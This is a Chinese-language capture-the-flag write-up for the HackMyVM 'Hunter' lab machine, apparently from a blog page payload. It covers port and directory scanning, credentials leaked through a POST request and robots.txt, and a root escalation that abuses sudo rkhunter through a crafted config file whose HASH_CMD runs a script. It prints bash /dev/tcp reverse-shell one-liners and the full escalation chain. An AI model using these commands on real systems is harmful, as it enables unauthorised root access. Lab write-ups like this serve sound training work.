{"pageProps":{"postData":{"id":"HackMyVMHunter","contentHtml":"<h1>Hunter</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Hunter\">https://hackmyvm.eu/machines/machine.php?vm=Hunter</a></p>\n</blockquote>\n<p><img src=\"/post-images/HackMyVMHunter/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-c\">âœ  Hunter nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.0</span>/<span class=\"hljs-number\">24</span>\nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-11-19 20:07 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.1</span>\nHost is up (<span class=\"hljs-number\">0.00035</span>s latency).\nMAC Address: <span class=\"hljs-number\">0</span>A:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">09</span> (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.2</span>\nHost is up (<span class=\"hljs-number\">0.00039</span>s latency).\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:DF:<span class=\"hljs-number\">48</span>:<span class=\"hljs-number\">1B</span> (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.146</span>\nHost is up (<span class=\"hljs-number\">0.00026</span>s latency).\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">76</span>:<span class=\"hljs-number\">87</span> (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-c\">âœ  Hunter nmap -p- -min-rate <span class=\"hljs-number\">10000</span> -n -Pn -sCV <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.146</span>\nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-11-19 20:07 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.146</span>\nHost is up (<span class=\"hljs-number\">0.00035</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp   open  ssh     OpenSSH <span class=\"hljs-number\">10.0</span> (protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">8080</span>/tcp open  http    Golang net/http server\n|_http-open-proxy: Proxy might be redirecting requests\n| http-robots.txt: <span class=\"hljs-number\">1</span> disallowed entry\n|_/admin\n|_http-title: Site doesn<span class=\"hljs-string\">'t have a title (text/plain; charset=utf-8).\n| fingerprint-strings:\n|   FourOhFourRequest, GetRequest, HTTPOptions:\n|     HTTP/1.0 200 OK\n|     Date: Wed, 19 Nov 2025 12:08:02 GMT\n|     Content-Length: 21\n|     Content-Type: text/plain; charset=utf-8\n|     Yes, thats a CTF :_(\n|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5:\n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   OfficeScan:\n|     HTTP/1.1 400 Bad Request: missing required Host header\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|_    Request: missing required Host header\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8080-TCP:V=7.95%I=7%D=11/19%Time=691DB325%P=x86_64-pc-linux-gnu%r(G\nSF:etRequest,8A,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nDate:\\x20Wed,\\x2019\\x20Nov\\x202\nSF:025\\x2012:08:02\\x20GMT\\r\\nContent-Length:\\x2021\\r\\nContent-Type:\\x20tex\nSF:t/plain;\\x20charset=utf-8\\r\\n\\r\\nYes,\\x20thats\\x20a\\x20CTF\\x20:_\\(\\n\")%\nSF:r(HTTPOptions,8A,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nDate:\\x20Wed,\\x2019\\x20Nov\\\nSF:x202025\\x2012:08:02\\x20GMT\\r\\nContent-Length:\\x2021\\r\\nContent-Type:\\x2\nSF:0text/plain;\\x20charset=utf-8\\r\\n\\r\\nYes,\\x20thats\\x20a\\x20CTF\\x20:_\\(\\\nSF:n\")%r(RTSPRequest,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Typ\nSF:e:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x\nSF:20Bad\\x20Request\")%r(FourOhFourRequest,8A,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nDa\nSF:te:\\x20Wed,\\x2019\\x20Nov\\x202025\\x2012:08:02\\x20GMT\\r\\nContent-Length:\\\nSF:x2021\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\n\\r\\nYes,\\x20t\nSF:hats\\x20a\\x20CTF\\x20:_\\(\\n\")%r(Socks5,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Re\nSF:quest\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x\nSF:20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r(GenericLines,67,\"HTTP/1\\.1\\x20\nSF:400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\\nSF:r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r(Help,67,\"HTTP/\nSF:1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charse\nSF:t=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r(SSLSes\nSF:sionReq,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text\nSF:/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20R\nSF:equest\")%r(LPDString,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-\nSF:Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n40\nSF:0\\x20Bad\\x20Request\")%r(SIPOptions,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Reque\nSF:st\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20c\nSF:lose\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r(OfficeScan,A3,\"HTTP/1\\.1\\x20400\\x\nSF:20Bad\\x20Request:\\x20missing\\x20required\\x20Host\\x20header\\r\\nContent-T\nSF:ype:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\nSF:\\x20Bad\\x20Request:\\x20missing\\x20required\\x20Host\\x20header\");\nMAC Address: 08:00:27:22:76:87 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 30.32 seconds\n</span></code></pre>\n<h3>æšä¸¾</h3>\n<p><code>8080</code> ç«¯å£</p>\n<p><img src=\"/post-images/HackMyVMHunter/image1.png\" alt=\"image.png\"></p>\n<p>ç›®å½•æ‰«æ</p>\n<pre><code class=\"hljs language-c\">âœ  Hunter feroxbuster --url http:<span class=\"hljs-comment\">//192.168.56.146:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503,400 -x php,txt,zip</span>\n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben <span class=\"hljs-string\">\"epi\"</span> Risher ğŸ¤“                 ver: <span class=\"hljs-number\">2.11</span>.<span class=\"hljs-number\">0</span>\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ¯  Target Url            â”‚ http:<span class=\"hljs-comment\">//192.168.56.146:8080</span>\n ğŸš€  Threads               â”‚ <span class=\"hljs-number\">50</span>\n ğŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/directory-<span class=\"hljs-built_in\">list</span><span class=\"hljs-number\">-2.3</span>-medium.txt\n ğŸ’¢  Status Code Filters   â”‚ [<span class=\"hljs-number\">404</span>, <span class=\"hljs-number\">503</span>, <span class=\"hljs-number\">400</span>]\n ğŸ’¥  Timeout (secs)        â”‚ <span class=\"hljs-number\">7</span>\n ğŸ¦¡  User-Agent            â”‚ feroxbuster/<span class=\"hljs-number\">2.11</span>.<span class=\"hljs-number\">0</span>\n ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml\n ğŸ”  Extract Links         â”‚ <span class=\"hljs-literal\">true</span>\n ğŸ’²  Extensions            â”‚ [php, txt, zip]\n ğŸ  HTTP methods          â”‚ [GET]\n ğŸ”ƒ  Recursion Depth       â”‚ <span class=\"hljs-number\">4</span>\n ğŸ‰  New Version Available â”‚ https:<span class=\"hljs-comment\">//github.com/epi052/feroxbuster/releases/latest</span>\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n<span class=\"hljs-number\">200</span>      GET        <span class=\"hljs-number\">1l</span>        <span class=\"hljs-number\">2</span>w       <span class=\"hljs-number\">13</span>c http:<span class=\"hljs-comment\">//192.168.56.146:8080/admin</span>\n<span class=\"hljs-number\">200</span>      GET        <span class=\"hljs-number\">1l</span>        <span class=\"hljs-number\">5</span>w       <span class=\"hljs-number\">21</span>c Auto-filtering found <span class=\"hljs-number\">404</span>-like response and created new filter; toggle off with --dont-filter\n<span class=\"hljs-number\">200</span>      GET        <span class=\"hljs-number\">2l</span>        <span class=\"hljs-number\">4</span>w       <span class=\"hljs-number\">31</span>c http:<span class=\"hljs-comment\">//192.168.56.146:8080/robots.txt</span>\n<span class=\"hljs-number\">204</span>      GET        <span class=\"hljs-number\">0l</span>        <span class=\"hljs-number\">0</span>w        <span class=\"hljs-number\">0</span>c http:<span class=\"hljs-comment\">//192.168.56.146:8080/beacon</span>\n[####################] - <span class=\"hljs-number\">51</span>s   <span class=\"hljs-number\">882184</span>/<span class=\"hljs-number\">882184</span>  <span class=\"hljs-number\">0</span>s      found:<span class=\"hljs-number\">3</span>       errors:<span class=\"hljs-number\">0</span>      \n[####################] - <span class=\"hljs-number\">51</span>s   <span class=\"hljs-number\">882180</span>/<span class=\"hljs-number\">882180</span>  <span class=\"hljs-number\">17405</span>/s http:<span class=\"hljs-comment\">//192.168.56.146:8080/ </span>\n</code></pre>\n<p><code>beacon</code> è¿”å›ä»£ç  204ï¼šæ— å†…å®¹ã€‚æœåŠ¡å™¨æˆåŠŸå¤„ç†ï¼Œä½†æœªè¿”å›å†…å®¹ã€‚åœ¨æœªæ›´æ–°ç½‘é¡µçš„æƒ…å†µä¸‹ï¼Œå¯ç¡®ä¿æµè§ˆå™¨ç»§ç»­æ˜¾ç¤ºå½“å‰æ–‡æ¡£</p>\n<pre><code class=\"hljs language-c\">âœ  Hunter wget http:<span class=\"hljs-comment\">//192.168.56.146:8080/beacon</span>\n-<span class=\"hljs-number\">-2025</span><span class=\"hljs-number\">-11</span><span class=\"hljs-number\">-19</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">31</span>--  http:<span class=\"hljs-comment\">//192.168.56.146:8080/beacon</span>\næ­£åœ¨è¿æ¥ <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.146</span>:<span class=\"hljs-number\">8080.</span>.. å·²è¿æ¥ã€‚\nå·²å‘å‡º HTTP è¯·æ±‚ï¼Œæ­£åœ¨ç­‰å¾…å›åº”... <span class=\"hljs-number\">204</span> No Content\n<span class=\"hljs-number\">2025</span><span class=\"hljs-number\">-11</span><span class=\"hljs-number\">-19</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">31</span> (<span class=\"hljs-number\">0.00</span> B/s) - â€œbeaconâ€ å·²ä¿å­˜ [<span class=\"hljs-number\">0</span>]\n</code></pre>\n<p><code>robots.txt</code></p>\n<p><img src=\"/post-images/HackMyVMHunter/image2.png\" alt=\"image.png\"></p>\n<p>æŒ‰ç…§ <code>robots</code> æ–‡ä»¶è¯´çš„å­˜åœ¨ <code>admin</code> ï¼Œæç¤º <code>Invalid JWT</code></p>\n<p><img src=\"/post-images/HackMyVMHunter/image3.png\" alt=\"image.png\"></p>\n<p>è¿™é‡Œåº”è¯¥æ˜¯è¦æ¨¡æ‹ŸJWTï¼Ÿä½†æ˜¯æ²¡æœ‰ä»»ä½•ä¿¡æ¯ï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•å¸¦æœ‰JWTçš„åŒ…</p>\n<p>å°è¯•å°†åŒ…æ”¹ä¸º POST è¯·æ±‚åï¼Œä»è¿”å›åŒ…ä¸­èƒ½å¾—åˆ°ä¸€ç»„å‡­æ®ï¼š<strong><code>hunterman</code>:<code>thisisnitriilcisi</code></strong></p>\n<p><img src=\"/post-images/HackMyVMHunter/image4.png\" alt=\"image.png\"></p>\n<p>èƒ½é€šè¿‡ SSH ç™»å½•è¿›å»</p>\n<p><img src=\"/post-images/HackMyVMHunter/image5.png\" alt=\"image.png\"></p>\n<h2>ææƒ</h2>\n<h3>Got huntergirl</h3>\n<p>ç™»å½•ä¸Šå»åï¼Œèƒ½å‘ç°è¿˜æœ‰ä¸€ä¸ªç”¨æˆ· <code>huntergirl</code></p>\n<pre><code class=\"hljs language-c\">hunter:~$ ls /home\nhuntergirl  hunterman\n</code></pre>\n<p>ä¸Šä¼ äº† linpeas ä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°ä»€ä¹ˆæ–°ä¸œè¥¿</p>\n<p>åé¢å‘ç° robots.txt æ–‡ä»¶å’Œåœ¨<code>web</code> ä¸Šçœ‹çš„ä¸å¤ªä¸€æ ·ï¼Œé‡Œé¢æ˜¯ <code>huntergirl</code> çš„å‡­æ®</p>\n<pre><code class=\"hljs language-c\">hunter:/var/www/html$ ls\nadmin       beacon      index       robots.txt\nhunter:/var/www/html$ cat robots.txt \nh u n t e r g i r l:fickshitmichini\n</code></pre>\n<h3>Got root</h3>\n<p>æŸ¥çœ‹ sudo æƒé™</p>\n<pre><code class=\"hljs language-c\">hunter:~$ sudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> huntergirl on hunter:\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nRunas and Command-specific defaults <span class=\"hljs-keyword\">for</span> huntergirl:\n    Defaults!/usr/sbin/visudo env_keep+=<span class=\"hljs-string\">\"SUDO_EDITOR EDITOR VISUAL\"</span>\n\nUser huntergirl may run the following commands on hunter:\n    (root) NOPASSWD: /usr/local/bin/rkhunter\n</code></pre>\n<p>æŸ¥çœ‹æ˜¯å•¥ç©æ„</p>\n<pre><code class=\"hljs language-c\">hunter:~$ sudo /usr/local/bin/rkhunter -V\nRootkit Hunter <span class=\"hljs-number\">1.4</span>.<span class=\"hljs-number\">6</span>\n\nThis software was developed by the Rootkit Hunter project team.\nPlease review your rkhunter configuration files before using.\nPlease review the documentation before posting bug reports or questions.\nTo report bugs, provide patches or comments, please go to:\nhttp:<span class=\"hljs-comment\">//rkhunter.sourceforge.net</span>\n\nTo ask questions about rkhunter, please use the rkhunter-users mailing <span class=\"hljs-built_in\">list</span>.\nNote this is a moderated <span class=\"hljs-built_in\">list</span>: please subscribe before posting.\n\nRootkit Hunter comes with ABSOLUTELY NO WARRANTY.\nThis is <span class=\"hljs-built_in\">free</span> software, and you are welcome to redistribute it under the\nterms of the GNU General Public License. See the LICENSE file <span class=\"hljs-keyword\">for</span> details.\n</code></pre>\n<blockquote>\n<p>ä¸€æ¬¾é€‚ç”¨äºç¬¦åˆ POSIX æ ‡å‡†çš„ç³»ç»Ÿçš„å¼€æºå®‰å…¨ã€ç›‘æ§å’Œåˆ†æå·¥å…·ã€‚</p>\n</blockquote>\n<p>èƒ½å‘ç°æœ‰ <code>configfile</code> å‚æ•°</p>\n<p><img src=\"/post-images/HackMyVMHunter/image6.png\" alt=\"image.png\"></p>\n<p>é»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼š<a href=\"https://github.com/crunchsec/rkhunter/blob/master/files/rkhunter.conf\">https://github.com/crunchsec/rkhunter/blob/master/files/rkhunter.conf</a></p>\n<p>é€šè¿‡ AI åˆ†æé…ç½®ï¼Œèƒ½å¾—åˆ°ä¸€äº›æœ‰è¶£çš„åˆ©ç”¨ç‚¹ï¼Œä¾‹å¦‚ï¼šSCRIPTDIR å’Œ HASH_CMDã€‚</p>\n<p>PS: SCRIPTDIR æˆ‘æ²¡æœ‰åˆ©ç”¨æˆåŠŸ</p>\n<pre><code class=\"hljs language-bash\">å¥½çš„ï¼Œæˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹è¿™ä¸ª rkhunter.conf é…ç½®æ–‡ä»¶ï¼Œå¯»æ‰¾åœ¨CTFåœºæ™¯ä¸‹å¯ä»¥åˆ©ç”¨çš„ææƒç‚¹ã€‚\n\nä½ çš„æƒ…æ™¯éå¸¸å…¸å‹ï¼š\n\næ‹¥æœ‰æƒé™ï¼šå¯ä»¥ä»¥ root èº«ä»½æ‰§è¡Œ rkhunterã€‚\næ§åˆ¶é…ç½®ï¼šå¯ä»¥ä½¿ç”¨ --configfile æˆ– -c å‚æ•°æŒ‡å®šä¸€ä¸ªä½ å¯å†™çš„é…ç½®æ–‡ä»¶ã€‚\nç›®æ ‡ï¼šé€šè¿‡ä¿®æ”¹é…ç½®ï¼Œè®© rkhunter åœ¨æ‰§è¡Œæ—¶è¿è¡Œä½ çš„æ¶æ„ä»£ç ï¼Œä»è€Œè·å¾—ä¸€ä¸ª root shellã€‚\nrkhunter æ˜¯ä¸€ä¸ªå®‰å…¨æ‰«æå·¥å…·ï¼Œå®ƒä¼šè°ƒç”¨å¤§é‡çš„ç³»ç»Ÿå‘½ä»¤ã€è„šæœ¬å’Œå¤–éƒ¨ç¨‹åºæ¥å®Œæˆæ£€æŸ¥ã€‚è¿™æ­£æ˜¯æˆ‘ä»¬çš„æœºä¼šæ‰€åœ¨ã€‚å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶å®ƒè°ƒç”¨çš„å‘½ä»¤æˆ–è„šæœ¬çš„è·¯å¾„ï¼Œå°±å¯ä»¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚\n\nä»¥ä¸‹æ˜¯é…ç½®æ–‡ä»¶ä¸­å‡ ä¸ªæœ€å…³é”®ã€æœ€å®¹æ˜“åˆ©ç”¨çš„ææƒç‚¹ï¼ŒæŒ‰ç…§æˆåŠŸç‡å’Œç®€æ˜“åº¦æ’åºï¼š\n\n1. SCRIPTDIR (æœ€é«˜ä¼˜å…ˆçº§ï¼Œæœ€å¯é )\næè¿°ï¼šè¿™ä¸ªé€‰é¡¹æŒ‡å®šäº† rkhunter å†…éƒ¨è„šæœ¬æ‰€åœ¨çš„ç›®å½•ã€‚rkhunter ä¸¥é‡ä¾èµ–è¿™äº›è„šæœ¬æ¥æ‰§è¡Œå„ç§æ£€æŸ¥ã€‚\n\nåˆ©ç”¨æ–¹æ³•ï¼š\n\nåœ¨ /tmp æˆ–å…¶ä»–ä½ å¯å†™çš„ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–°ç›®å½•ï¼Œä¾‹å¦‚ /tmp/evil_scriptsã€‚\næŸ¥çœ‹ rkhunter é»˜è®¤çš„ SCRIPTDIRï¼ˆé€šå¸¸æ˜¯ /usr/local/lib/rkhunter/scripts æˆ–ç±»ä¼¼è·¯å¾„ï¼‰ï¼Œæ‰¾åˆ°å…¶ä¸­ä¸€ä¸ªè„šæœ¬çš„åå­—ï¼Œä¾‹å¦‚ readlink.sh æˆ– stat.shã€‚\nåœ¨ä½ çš„ /tmp/evil_scripts ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåŒåçš„æ¶æ„è„šæœ¬ readlink.shã€‚å†…å®¹å¯ä»¥æ˜¯ä¸€ä¸ªåå‘ shellï¼š\n&#x3C;BASH>\n<span class=\"hljs-comment\">#!/bin/bash</span>\nbash -i >&#x26; /dev/tcp/YOUR_IP/YOUR_PORT 0>&#x26;1\nç¡®ä¿ä½ çš„è„šæœ¬æœ‰æ‰§è¡Œæƒé™ï¼š <span class=\"hljs-built_in\">chmod</span> +x /tmp/evil_scripts/readlink.shã€‚\nåˆ›å»ºä¸€ä¸ªä½ çš„é…ç½®æ–‡ä»¶ï¼Œä¾‹å¦‚ /tmp/evil.confï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n&#x3C;INI>\n<span class=\"hljs-comment\"># /tmp/evil.conf</span>\nSCRIPTDIR=/tmp/evil_scripts\nå¯åŠ¨ä½ çš„ netcat ç›‘å¬å™¨ï¼š nc -lvnp YOUR_PORTã€‚\nä»¥ root èº«ä»½æ‰§è¡Œ rkhunterï¼Œå¹¶æŒ‡å®šä½ çš„é…ç½®æ–‡ä»¶ï¼š\n&#x3C;BASH>\n<span class=\"hljs-built_in\">sudo</span> rkhunter --configfile /tmp/evil.conf --check\nå½“ rkhunter å°è¯•ä½¿ç”¨ readlink.sh è„šæœ¬æ—¶ï¼Œå®ƒä¼šæ‰§è¡Œä½ çš„æ¶æ„ç‰ˆæœ¬ï¼Œä½ å°±èƒ½æ”¶åˆ°ä¸€ä¸ª root shellã€‚\n2. HASH_CMD (éå¸¸å¯é )\næè¿°ï¼šè¿™ä¸ªé€‰é¡¹å®šä¹‰äº†ç”¨äºæ–‡ä»¶å±æ€§å“ˆå¸Œæ£€æŸ¥çš„å‘½ä»¤ã€‚rkhunter ä¼šåœ¨è¿›è¡Œæ–‡ä»¶å®Œæ•´æ€§æ ¡éªŒæ—¶æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ã€‚\n\nåˆ©ç”¨æ–¹æ³•ï¼š\n\nåˆ›å»ºä¸€ä¸ªæ¶æ„è„šæœ¬ï¼Œä¾‹å¦‚ /tmp/revshell.shï¼Œå†…å®¹ä¸ºåå‘ shellã€‚\n&#x3C;BASH>\n<span class=\"hljs-comment\">#!/bin/bash</span>\nbash -i >&#x26; /dev/tcp/YOUR_IP/YOUR_PORT 0>&#x26;1\nç»™äºˆæ‰§è¡Œæƒé™ï¼š <span class=\"hljs-built_in\">chmod</span> +x /tmp/revshell.shã€‚\nåˆ›å»ºä½ çš„é…ç½®æ–‡ä»¶ /tmp/evil.confï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n&#x3C;INI>\n<span class=\"hljs-comment\"># /tmp/evil.conf</span>\nHASH_CMD=/tmp/revshell.sh\nå¯åŠ¨ç›‘å¬å™¨ nc -lvnp YOUR_PORTã€‚\næ‰§è¡Œ rkhunterã€‚ä¸ºäº†ç¡®ä¿å“ˆå¸Œæ£€æŸ¥ä¸€å®šä¼šè¢«è§¦å‘ï¼Œå¯ä»¥è¿è¡Œå±æ€§æ›´æ–°å‘½ä»¤ï¼š\n&#x3C;BASH>\n<span class=\"hljs-built_in\">sudo</span> rkhunter --configfile /tmp/evil.conf --propupd\næˆ–è€…ç›´æ¥è¿›è¡Œæ£€æŸ¥ï¼š\n&#x3C;BASH>\n<span class=\"hljs-built_in\">sudo</span> rkhunter --configfile /tmp/evil.conf --check\nå½“æ–‡ä»¶å±æ€§æ£€æŸ¥å¼€å§‹æ—¶ï¼Œrkhunter å°±ä¼šæ‰§è¡Œ /tmp/revshell.shï¼Œç»™ä½ ä¸€ä¸ª root shellã€‚\n</code></pre>\n<p>ä½†æ˜¯ä¸€ç›´ä¼šæŠ¥é”™ï¼Œæç¤ºæ‰¾ä¸åˆ°è·¯å¾„é—®ä»·ä¸å­˜åœ¨ä¹‹ç±»çš„æŠ¥é”™</p>\n<p><img src=\"/post-images/HackMyVMHunter/image7.png\" alt=\"image.png\"></p>\n<p>åˆ†æä¸€æ³¢åï¼Œé…ç½®æ–‡ä»¶éœ€è¦å¦‚ä¸‹å‚æ•°ï¼š</p>\n<ul>\n<li><code>TMPDIR</code>: ä¸´æ—¶æ–‡ä»¶ç›®å½•</li>\n<li><code>DBDIR</code>: æ•°æ®åº“ç›®å½•</li>\n<li><code>SCRIPTDIR</code>: è„šæœ¬ç›®å½•</li>\n<li><code>LOGFILE</code>: æ—¥å¿—æ–‡ä»¶è·¯å¾„</li>\n<li><code>INSTALLDIR</code>: å®‰è£…ç›®å½•</li>\n</ul>\n<pre><code class=\"hljs language-c\">å¥½çš„ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸è¯¦ç»†çš„ rkhunter.conf é…ç½®æ–‡ä»¶ã€‚åˆ†æè¿™ä¸ªæ–‡ä»¶å¹¶å›ç­”â€œæœ€å°‘éœ€è¦å“ªäº›å‚æ•°ï¼Ÿâ€è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥ä»ä¸¤ä¸ªå±‚é¢æ¥ç†è§£ï¼š\n\næŠ€æœ¯ä¸Šçš„æœ€å°‘å‚æ•°ï¼šè®© rkhunter èƒ½å¤ŸæˆåŠŸè¿è¡Œçš„ç»å¯¹æœ€å°å€¼ã€‚\nå®è·µä¸­çš„æœ€å°‘å‚æ•°ï¼šä¸ºäº†è®© rkhunter å˜å¾—å®ç”¨ã€æœ‰æ•ˆï¼Œå¹¶ä¸”ä¸ä¼šäº§ç”Ÿå¤§é‡è¯¯æŠ¥ï¼Œæ¨èé…ç½®çš„æœ€å°‘å‚æ•°é›†ã€‚\nå¾ˆæ˜æ˜¾ï¼Œç¬¬äºŒä¸ªå±‚é¢æ›´æœ‰æ„ä¹‰ã€‚\n\nå±‚é¢ä¸€ï¼šæŠ€æœ¯ä¸Šçš„æœ€å°‘å‚æ•°\nä»æŠ€æœ¯è§’åº¦è®²ï¼Œå¦‚æœ rkhunter æ˜¯é€šè¿‡åŒ…ç®¡ç†å™¨ï¼ˆå¦‚ apt æˆ– yumï¼‰æ­£ç¡®å®‰è£…çš„ï¼Œä½ å‡ ä¹ä¸éœ€è¦ä¿®æ”¹ä»»ä½•å‚æ•°ã€‚å®‰è£…è„šæœ¬é€šå¸¸ä¼šæ­£ç¡®è®¾ç½®ä»¥ä¸‹å…³é”®è·¯å¾„ï¼š\n\nTMPDIR: ä¸´æ—¶æ–‡ä»¶ç›®å½•\nDBDIR: æ•°æ®åº“ç›®å½•\nSCRIPTDIR: è„šæœ¬ç›®å½•\nLOGFILE: æ—¥å¿—æ–‡ä»¶è·¯å¾„\nINSTALLDIR: å®‰è£…ç›®å½•\n</code></pre>\n<p>æ ¹æ®æœ€å°å‚æ•°ç¼–å†™é…ç½®æ–‡ä»¶ï¼Œå‚æ•°å°±ç”¨é»˜è®¤çš„é…ç½®æ–‡ä»¶é‡Œé¢çš„</p>\n<pre><code class=\"hljs language-c\">INSTALLDIR=/usr/local\nTMPDIR=/var/lib/rkhunter/tmp\nDBDIR=/var/lib/rkhunter/db\nSCRIPTDIR=/usr/local/lib/rkhunter/scripts\nLOGFILE=/var/<span class=\"hljs-built_in\">log</span>/rkhunter.<span class=\"hljs-built_in\">log</span>\nHASH_CMD=/tmp/revshell.sh\n</code></pre>\n<p>æœ€åçš„æµç¨‹ï¼š</p>\n<p>é¦–å…ˆå¼€å¯ç›‘å¬</p>\n<pre><code class=\"hljs language-c\">echo <span class=\"hljs-string\">\"/bin/bash -c 'bash -i >&#x26; /dev/tcp/192.168.56.6/1234 0>&#x26;1'\"</span> > /tmp/revshell.sh\n\ncat > /tmp/evil.conf &#x3C;&#x3C; EOF\nINSTALLDIR=/usr/local\nTMPDIR=/var/lib/rkhunter/tmp\nDBDIR=/var/lib/rkhunter/db\nSCRIPTDIR=/usr/local/lib/rkhunter/scripts\nLOGFILE=/var/<span class=\"hljs-built_in\">log</span>/rkhunter.<span class=\"hljs-built_in\">log</span>\nHASH_CMD=/tmp/revshell.sh\nEOF\n\nsudo /usr/local/bin/rkhunter --configfile /tmp/evil.conf --propupd\n</code></pre>\n<p><img src=\"/post-images/HackMyVMHunter/image8.png\" alt=\"image.png\"></p>","title":"HackMyVM - 